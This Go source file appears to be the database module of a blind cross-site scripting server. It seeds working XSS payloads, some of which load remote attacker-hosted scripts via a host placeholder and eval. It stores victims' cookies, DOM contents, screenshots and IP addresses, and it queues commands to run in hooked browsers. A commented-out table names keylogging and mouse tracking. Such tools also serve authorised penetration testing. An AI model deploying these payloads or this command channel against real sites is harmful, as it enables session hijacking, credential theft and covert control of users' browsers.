package database

import (
	"fmt"
	"log"
	"net/http"
	"strings"
	"time"
	"xsserve/core"

	"database/sql"

	_ "modernc.org/sqlite"
)

var db *sql.DB

func Open(uri string) (_ *sql.DB, err error) {
	log.Println("Attempting to connect to database: ", uri)
	driver := "sqlite"
	if strings.HasPrefix(uri, "sql://") {
		driver = "sql"
	}

	db, err = sql.Open(driver, uri)
	if err != nil {
		return nil, err
	}
	log.Println("Successfully connected to database:", uri)

	err = initialize()
	return db, err
}

func initialize() (err error) {
	payloads := []core.Payload{
		{Description: "As simple as it can get!", Code: "<script>alert(1)</script>"},
		{Description: "URI basic payload", Code: "javascript:alert(1)"},
		{Description: "Basic js code injection", Code: "; alert(1);"},
		{Description: "Simple attribute injection", Code: "\" onload=alert(1) "},
		{Description: "Attribute injection and tag escaping", Code: "\"><img src=x onerror=alert(1)>"},
		{Description: "Include remote script", Code: fmt.Sprintf("<script src='%v'></script>", "[[HOST_REPLACE_ME]]")},
		{Description: "Get script via jQuery and onload event", Code: fmt.Sprintf("\"><svg onload='$.getScript(\\'%v\\', function(d, x, y){eval(d);})'>", "[[HOST_REPLACE_ME]]")},
	}

	db.Query(`CREATE TABLE IF NOT EXISTS "Payloads" (
		"id"	INTEGER NOT NULL UNIQUE,
		"Description"	TEXT,
		"Code"	TEXT NOT NULL UNIQUE,
		PRIMARY KEY("id")
	)`)

	db.Query(`CREATE TABLE IF NOT EXISTS "Triggers" (
		"id"	INTEGER NOT NULL UNIQUE,
		"Host"	TEXT,
		"URI"	TEXT,
		"DOM"	TEXT,
		"Cookies"	TEXT,
		"UID"	INTEGER,
		"Payload"	INTEGER,
		"Screenshot"	BLOB,
		"BrowserDate"	TEXT,
		"Referrer"	TEXT,
		"Origin"	TEXT,
		"Date"	TEXT,
		"UserAgent"	TEXT,
		"RemoteAddress" TEXT,
		PRIMARY KEY("id")
	)`)

	db.Query(`CREATE TABLE IF NOT EXISTS "TriggerCommands" (
		"id"	INTEGER NOT NULL UNIQUE,
		"TriggerId"	INTEGER NOT NULL,
		"QueuePosition"	INTEGER,
		"IssuedAt" TEXT,
		"RepliedAt" TEXT,
		"Code" TEXT,
		"Result" TEXT,
		PRIMARY KEY("id"),
		FOREIGN KEY(TriggerId) REFERENCES Triggers(id)
	)`)

	/*
		db.Query(`CREATE TABLE IF NOT EXISTS "Browsers" (
			"id"	INTEGER NOT NULL UNIQUE,
			"TriggerId"	INTEGER NOT NULL,
			"SpyImage"	INTEGER,
			"SpyFocusedElement" TEXT,
			"SpyKeylog" TEXT,
			"SpyMouseX" INTEGER,
			"SpyMouseY" INTEGER,
			PRIMARY KEY("id"),
			FOREIGN KEY(TriggerId) REFERENCES Triggers(id)
		)`)
	*/

	/*Check if we have and empty table, if so add the default payloads*/
	var count int
	rows := db.QueryRow("SELECT COUNT(*) from Payloads")
	rows.Scan(&count)

	if count < len(payloads) {
		log.Println("Creating initial database...")

		log.Println("Adding default payloads")
		for _, payload := range payloads {
			_, err := InsertPayload(&payload)
			if err != nil {
				log.Println("Failed to insert payload", err)
			} else {
				log.Println("Inserted default payload: ", payload)
			}
		}
	}

	return err
}

func Close() {
	log.Println("Closing database...")
	db.Close()
}

func InsertPayload(payload *core.Payload) (r sql.Result, err error) {
	r, err = db.Exec(`INSERT INTO "Payloads" (
		id,
		Description, 
		Code
		) VALUES (NULL, ?, ?)`, payload.Description, payload.Code)
	return r, err
}

func GetPayload(payload *core.Payload) (err error) {
	rows, err := db.Query(`SELECT * FROM Payloads WHERE id=?`, payload.ID)
	if err != nil {
		return err
	}
	defer rows.Close()

	rows.Scan(&payload.ID, &payload.Description, &payload.Code)
	return err
}

/*TODO: eventually allow filtering payloads*/
func GetPayloads() (payloads []core.Payload, err error) {
	rows, err := db.Query(`SELECT * FROM Payloads`)
	if err != nil {
		return payloads, err
	}
	defer rows.Close()

	for rows.Next() {
		var p core.Payload
		rows.Scan(&p.ID, &p.Description, &p.Code)
		payloads = append(payloads, p)
	}

	return payloads, err
}

func DeletePayload(payload *core.Payload) (err error) {
	_, err = db.Exec("DELETE FROM Payloads WHERE id=?", payload.ID)
	return err
}

func InsertTrigger(trigger *core.Trigger) (r sql.Result, err error) {
	var cookieStrings []string
	for _, cookie := range trigger.Cookies {
		cookieStrings = append(cookieStrings, cookie.String())
	}

	r, err = db.Exec(`INSERT INTO "Triggers" (
				"id",
				"Host", 
				"URI", 
				"DOM", 
				"Cookies", 
				"UID",
				"Payload",
				"Screenshot",
				"BrowserDate",
				"Referrer", 
				"Origin", 
				"Date", 
				"UserAgent",
				"RemoteAddress"
		) VALUES (NULL, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
		trigger.Host, trigger.URI, trigger.DOM, strings.Join(cookieStrings, ";"), trigger.UID, trigger.Payload.ID,
		trigger.Screenshot, trigger.BrowserDate.Format("Mon Jan 2 15:04:05 -0700 MST 2006"), trigger.Referrer, trigger.Origin, trigger.Date.Format("Mon Jan 2 15:04:05 -0700 MST 2006"),
		trigger.UserAgent, trigger.RemoteAddr)

	/*TODO: get UID, check if any payload was generated with UID, populate trigger.Payload accordingly*/

	return r, err
}

func GetTrigger(trigger *core.Trigger) (err error) {
	rows, err := db.Query(`SELECT * FROM Triggers WHERE id=?`, trigger.ID)
	if err != nil {
		return err
	}
	defer rows.Close()

	triggers, err := rowsToTriggers(rows)
	if err != nil {
		return err
	}

	if len(triggers) > 0 {
		//TODO: find a more elegant way (copy struct mem?)
		trigger.UID = triggers[0].UID
		trigger.ID = triggers[0].ID
		trigger.BrowserDate = triggers[0].BrowserDate
		trigger.Date = triggers[0].Date
		trigger.Cookies = triggers[0].Cookies
		trigger.DOM = triggers[0].DOM
		trigger.Host = triggers[0].Host
		trigger.RemoteAddr = triggers[0].RemoteAddr
		trigger.Referrer = triggers[0].Referrer
		trigger.Origin = triggers[0].Origin
		trigger.Screenshot = triggers[0].Screenshot
		trigger.Payload = triggers[0].Payload
		trigger.URI = triggers[0].URI
		trigger.UserAgent = triggers[0].UserAgent
	}

	return err
}

func GetCommandsForTrigger(trigger *core.Trigger) ([]core.TriggerCommand, error) {
	var triggerID int
	err := db.QueryRow(`SELECT ID FROM Triggers WHERE UID=? LIMIT 1`, trigger.UID).Scan(&triggerID)
	if err != nil {
		return nil, err
	}

	//rows, err := db.Query(`SELECT Code FROM TriggerCommands WHERE TriggerId=? AND Result IS NOT NULL ORDER BY QueuePosition`, triggerID)
	rows, err := db.Query(`SELECT * FROM TriggerCommands WHERE TriggerID=? ORDER BY QueuePosition`, triggerID)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var commands []core.TriggerCommand

	for rows.Next() {
		var c core.TriggerCommand
		err = rows.Scan(&c.ID, &c.TriggerId, &c.QueuePosition, &c.IssuedAt, &c.RepliedAt, &c.Code, &c.Result)
		if err != nil {
			break
		}
		commands = append(commands, c)
	}

	//log.Println(commands)
	return commands, err
}

func InsertCommandForTrigger(trigger *core.Trigger, command string) (r sql.Result, err error) {
	commands, _ := GetCommandsForTrigger(trigger)
	//if err != nil && err != sql.ErrNoRows {
	//	return r, err
	//}
	queue := len(commands)

	r, err = db.Exec(`INSERT INTO "TriggerCommands" (
		id,
		RepliedAt,
		Result,
		TriggerId, 
		QueuePosition,
		IssuedAt,
		Code
		) VALUES (NULL, NULL, NULL, ?, ?, ?, ?)`, trigger.ID, queue, time.Now().String(), command)
	return r, err
}

/*TODO: eventually allow filtering given a trigger struct*/
func GetTriggers() (triggers []core.Trigger, err error) {
	rows, err := db.Query(`SELECT * FROM Triggers`)
	if err != nil {
		return triggers, err
	}
	defer rows.Close()

	triggers, err = rowsToTriggers(rows)
	return triggers, err
}

func DeleteTrigger(trigger *core.Trigger) (err error) {
	db.Exec("DELETE FROM Triggers WHERE id=?", trigger.ID)
	_, err = db.Exec("DELETE FROM TriggerCommands WHERE TriggerID=?", trigger.ID)
	return err
}

func DeleteTriggerCommands(trigger *core.Trigger) (err error) {
	var triggerID int
	err = db.QueryRow(`SELECT ID FROM Triggers WHERE UID=? LIMIT 1`, trigger.UID).Scan(&triggerID)
	if err != nil {
		return err
	}

	_, err = db.Exec("DELETE FROM TriggerCommands WHERE TriggerID=?", triggerID)
	return err
}

func rowsToTriggers(rows *sql.Rows) (triggers []core.Trigger, err error) {
	for rows.Next() {
		var t core.Trigger

		var cookieString string
		var payload core.Payload
		var triggerDate string
		var browserDate string

		/*Pupulate trigger*/
		rows.Scan(&t.ID, &t.Host, &t.URI, &t.DOM, &cookieString, &t.UID, &payload.ID, &t.Screenshot,
			&browserDate, &t.Referrer, &t.Origin, &triggerDate, &t.UserAgent, &t.RemoteAddr)

		//Convert cookie string to cookies
		header := http.Header{}
		header.Add("Cookie", cookieString)
		request := http.Request{Header: header}
		t.Cookies = request.Cookies()

		//Convert strings to time.Time
		t.Date, err = time.Parse("Mon Jan 2 15:04:05 -0700 MST 2006", triggerDate)
		if err != nil {
			log.Println("Error parsing date:", err)
		}
		t.BrowserDate, err = time.Parse("Mon Jan 2 15:04:05 -0700 MST 2006", browserDate)
		if err != nil {
			log.Println("Error parsing date:", err)
		}

		t.Payload = core.Payload{}
		if t.UID != "" { // Should be safe to assume that if we haven't used UID for our payload, we cant possibly know which payload worked, right?
			err = GetPayload(&payload) //TODO? this is 0 by default, so lets make it be -1 or something if uid is not given
			if err != nil {
				log.Println("Error getting payload:", err)
			}
			t.Payload = payload
		}

		// Append to triggers
		triggers = append(triggers, t)
	}

	return triggers, err
}
